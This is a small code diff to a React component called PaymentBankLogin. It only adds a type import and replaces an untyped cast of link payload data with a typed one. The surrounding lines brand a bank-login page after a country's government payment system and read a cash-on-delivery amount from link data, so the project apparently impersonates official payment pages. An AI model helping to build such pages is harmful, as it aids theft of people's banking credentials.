@@ -1,3 +1,4 @@
+import type { PaymentPayload } from "@/types/payload";
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -52,7 +53,7 @@ const PaymentBankLogin = () => {
   // Get government payment system for branding
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload as PaymentPayload;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
